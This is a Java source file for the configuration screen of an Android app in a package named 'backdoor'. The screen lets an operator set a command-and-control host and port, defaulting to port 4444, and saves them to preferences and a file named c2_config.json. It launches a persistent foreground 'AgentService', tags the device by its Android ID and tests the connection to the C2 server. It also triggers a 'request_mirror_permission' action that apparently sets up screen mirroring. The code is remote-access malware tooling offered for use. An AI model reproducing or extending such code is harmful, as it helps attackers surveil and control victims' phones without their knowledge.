package com.lazyframework.backdoor;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.textfield.TextInputEditText;

public class ConfigActivity extends AppCompatActivity {

    private static final String TAG = "ConfigActivity";
    private static final String PREFS_NAME = "LazyFramework";
    private static final String KEY_C2_HOST = "C2_HOST";
    private static final String KEY_C2_PORT = "C2_PORT";

    // UI Components
    private TextInputEditText etHost;
    private TextInputEditText etPort;
    private MaterialButton btnSave;
    private Button btnTestConnection;
    private TextView tvStatus;
    private TextView tvCurrentConfig;
    // ✅ TAMBAHKAN TOMBOL UNTUK BUKA MAINACTIVITY
    private MaterialButton btnOpenMain;

    private SharedPreferences prefs;
    private Handler mainHandler;

    // Default values
    private static final String DEFAULT_HOST = "192.168.1.8";
    private static final int DEFAULT_PORT = 4444;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_config);

        mainHandler = new Handler(Looper.getMainLooper());

        // Initialize views
        initViews();

        // Load saved config
        loadConfig();

        // Setup listeners
        setupListeners();

        // Show current config
        updateStatusDisplay();

        Log.d(TAG, "✅ ConfigActivity created");
    }

    private void initViews() {
        etHost = findViewById(R.id.et_host);
        etPort = findViewById(R.id.et_port);
        btnSave = findViewById(R.id.btn_save);
        btnTestConnection = findViewById(R.id.btn_test_connection);
        tvStatus = findViewById(R.id.tv_status);
        tvCurrentConfig = findViewById(R.id.tv_current_config);
        // ✅ INISIALISASI TOMBOL
        btnOpenMain = findViewById(R.id.btn_open_main);

        if (etHost.getText() == null || etHost.getText().toString().isEmpty()) {
            etHost.setText(DEFAULT_HOST);
        }
        if (etPort.getText() == null || etPort.getText().toString().isEmpty()) {
            etPort.setText(String.valueOf(DEFAULT_PORT));
        }
    }

    private void loadConfig() {
        try {
            prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

            String savedHost = prefs.getString(KEY_C2_HOST, DEFAULT_HOST);
            int savedPort = prefs.getInt(KEY_C2_PORT, DEFAULT_PORT);

            etHost.setText(savedHost);
            etPort.setText(String.valueOf(savedPort));

            Log.d(TAG, "📂 Loaded config: " + savedHost + ":" + savedPort);
        } catch (Exception e) {
            Log.e(TAG, "❌ Load config error: " + e.getMessage());
            Toast.makeText(this, "Error loading config: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void setupListeners() {
        btnSave.setOnClickListener(v -> saveConfig());
        btnTestConnection.setOnClickListener(v -> testConnection());

        // ✅ TAMBAHKAN LISTENER UNTUK BUKA MAINACTIVITY
        btnOpenMain.setOnClickListener(v -> openMainActivity());
    }

    // ✅ METHOD UNTUK MEMBUKA MAINACTIVITY
    private void openMainActivity() {
        try {
            Log.d(TAG, "📱 Opening MainActivity...");

            Intent intent = new Intent(this, MainActivity.class);
            intent.putExtra("action", "request_mirror_permission");
            intent.putExtra("agent_id", getAgentId());
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                    Intent.FLAG_ACTIVITY_CLEAR_TOP |
                    Intent.FLAG_ACTIVITY_SINGLE_TOP);

            startActivity(intent);
            Log.d(TAG, "✅ MainActivity opened");

        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to open MainActivity: " + e.getMessage());
            Toast.makeText(this, "Error opening MainActivity: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    // ✅ METHOD UNTUK MENDAPATKAN AGENT ID
    private String getAgentId() {
        try {
            return android.provider.Settings.Secure.getString(
                    getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "unknown";
        }
    }

    private void ensureAgentServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, AgentService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "🚀 AgentService started from ConfigActivity");
        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to start AgentService: " + e.getMessage());
        }
    }

    private void saveConfig() {
        try {
            String host = etHost.getText().toString().trim();
            String portStr = etPort.getText().toString().trim();

            if (host.isEmpty()) {
                showStatus("❌ Host cannot be empty", false);
                etHost.requestFocus();
                return;
            }

            if (portStr.isEmpty()) {
                showStatus("❌ Port cannot be empty", false);
                etPort.requestFocus();
                return;
            }

            int port;
            try {
                port = Integer.parseInt(portStr);
                if (port < 1 || port > 65535) {
                    showStatus("❌ Port must be between 1-65535", false);
                    etPort.requestFocus();
                    return;
                }
            } catch (NumberFormatException e) {
                showStatus("❌ Invalid port number", false);
                etPort.requestFocus();
                return;
            }

            // Save to SharedPreferences
            SharedPreferences.Editor editor = prefs.edit();
            editor.putString(KEY_C2_HOST, host);
            editor.putInt(KEY_C2_PORT, port);
            editor.apply();

            saveConfigToFile(host, port);

            Log.d(TAG, "💾 Config saved: " + host + ":" + port);
            showStatus("✅ Configuration saved successfully!", true);
            updateStatusDisplay();

            Toast.makeText(this, "Config saved! Updating service...", Toast.LENGTH_LONG).show();

            ensureAgentServiceRunning();

            mainHandler.postDelayed(() -> {
                updateAgentConfig(host, port);
            }, 1000);

        } catch (Exception e) {
            Log.e(TAG, "❌ Save config error: " + e.getMessage());
            showStatus("❌ Error: " + e.getMessage(), false);
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void saveConfigToFile(String host, int port) {
        try {
            String config = "{\"host\":\"" + host + "\",\"port\":" + port + "}";
            String filename = "c2_config.json";
            java.io.FileOutputStream fos = openFileOutput(filename, Context.MODE_PRIVATE);
            fos.write(config.getBytes());
            fos.close();
            Log.d(TAG, "💾 Config saved to file: " + filename);
        } catch (Exception e) {
            Log.e(TAG, "File save error: " + e.getMessage());
        }
    }

    private void updateAgentConfig(String host, int port) {
        try {
            Intent configIntent = new Intent();
            configIntent.setAction("com.lazyframework.CONFIG_UPDATED");
            configIntent.putExtra("C2_HOST", host);
            configIntent.putExtra("C2_PORT", port);
            configIntent.setPackage(getPackageName());

            sendBroadcast(configIntent);
            Log.d(TAG, "📡 Config update broadcast sent to AgentService");

            SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);
            prefs.edit()
                    .putString("C2_HOST", host)
                    .putInt("C2_PORT", port)
                    .apply();

            Log.d(TAG, "💾 Config saved to SharedPreferences");
            Toast.makeText(this, "Config updated! Service will reconnect.", Toast.LENGTH_SHORT).show();

        } catch (Exception e) {
            Log.e(TAG, "❌ Update config error: " + e.getMessage());
            Toast.makeText(this, "Error updating config: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void testConnection() {
        String host = etHost.getText().toString().trim();
        String portStr = etPort.getText().toString().trim();

        if (host.isEmpty() || portStr.isEmpty()) {
            showStatus("❌ Please enter host and port first", false);
            return;
        }

        int port;
        try {
            port = Integer.parseInt(portStr);
        } catch (NumberFormatException e) {
            showStatus("❌ Invalid port number", false);
            return;
        }

        showStatus("⏳ Testing connection to " + host + ":" + port + "...", true);
        btnTestConnection.setEnabled(false);

        new Thread(() -> {
            try {
                java.net.Socket socket = new java.net.Socket();
                socket.connect(new java.net.InetSocketAddress(host, port), 3000);
                socket.close();

                mainHandler.post(() -> {
                    showStatus("✅ Connection successful! Server is reachable.", true);
                    btnTestConnection.setEnabled(true);
                    Toast.makeText(this, "✅ Connection successful!", Toast.LENGTH_SHORT).show();
                });

            } catch (Exception e) {
                mainHandler.post(() -> {
                    showStatus("❌ Connection failed: " + e.getMessage(), false);
                    btnTestConnection.setEnabled(true);
                    Toast.makeText(this, "❌ Connection failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }

    private void updateStatusDisplay() {
        String host = prefs.getString(KEY_C2_HOST, DEFAULT_HOST);
        int port = prefs.getInt(KEY_C2_PORT, DEFAULT_PORT);

        String status = "Current Config: " + host + ":" + port;
        tvCurrentConfig.setText(status);
        tvCurrentConfig.setVisibility(View.VISIBLE);
    }

    private void showStatus(String message, boolean isSuccess) {
        tvStatus.setText(message);
        tvStatus.setVisibility(View.VISIBLE);

        if (isSuccess) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                tvStatus.setTextColor(getColor(android.R.color.holo_green_light));
            }
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                tvStatus.setTextColor(getColor(android.R.color.holo_red_light));
            }
        }

        mainHandler.removeCallbacks(hideStatusRunnable);
        mainHandler.postDelayed(hideStatusRunnable, 10000);
    }

    private final Runnable hideStatusRunnable = () -> {
        if (tvStatus != null) {
            tvStatus.setVisibility(View.GONE);
        }
    };

    public static String getC2Host(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(KEY_C2_HOST, DEFAULT_HOST);
    }

    public static int getC2Port(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getInt(KEY_C2_PORT, DEFAULT_PORT);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mainHandler.removeCallbacks(hideStatusRunnable);
        Log.d(TAG, "ConfigActivity destroyed");
    }
}